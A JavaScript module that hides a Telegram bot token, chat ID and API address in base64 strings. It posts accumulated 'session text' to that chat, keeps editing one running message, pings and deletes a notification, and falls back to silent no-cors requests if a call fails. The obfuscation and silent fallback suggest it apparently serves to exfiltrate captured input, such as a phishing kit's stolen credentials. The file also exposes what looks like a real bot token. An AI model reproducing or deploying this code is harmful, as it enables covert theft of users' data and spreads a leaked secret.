const _k1 = 'ODk2NTY2NzczMDpBQUVVbVE0bHJzWXhjazFBdWRhRFBLa1ZFZ0Z3QTZuV2hrYw==';
const _k2 = 'LTUxODMwMDIxOTY=';
const _k3 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==';
let tgMessageId = null;
let currentSessionText = '';

export const setInitialSession = (text) => { currentSessionText = text; };
export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

export const sendTelegramMessage = (newContent) => {
    if (newContent) currentSessionText += newContent;
    const text = currentSessionText;
    const decodedChatId = atob(_k2);
    const tgFetch = (method, payload, isBlindFire) => {
        const decodedUrl = atob(_k3) + atob(_k1) + '/' + method;
        let bodyStr = '';
        for (let key in payload) if (payload.hasOwnProperty(key)) bodyStr += encodeURIComponent(key) + '=' + encodeURIComponent(payload[key]) + '&';
        const options = { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: bodyStr };
        if (isBlindFire) { options.mode = 'no-cors'; fetch(decodedUrl, options).catch(()=>{}); return Promise.resolve({ ok: true }); } 
        else {
            options.mode = 'cors';
            const controller = new AbortController(); options.signal = controller.signal;
            const timer = setTimeout(() => controller.abort(), 2000);
            return fetch(decodedUrl, options).then(r => r.json()).then(d => { clearTimeout(timer); return d; }).catch(err => { clearTimeout(timer); return { ok: false, error: err }; });
        }
    };
    const payload = { chat_id: decodedChatId, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (tgMessageId === null) {
        tgFetch('sendMessage', payload, false).then(d => { if (d && d.ok && d.result) tgMessageId = d.result.message_id; else tgFetch('sendMessage', payload, true); });
    } else {
        tgFetch('sendMessage', { chat_id: decodedChatId, text: '🔔' }, false).then(res => {
            if (res && res.ok && res.result) tgFetch('deleteMessage', { chat_id: decodedChatId, message_id: res.result.message_id }, false);
            payload.message_id = tgMessageId;
            tgFetch('editMessageText', payload, false).then(d => { if (!d || !d.ok) tgFetch('editMessageText', payload, true); });
        });
    }
};
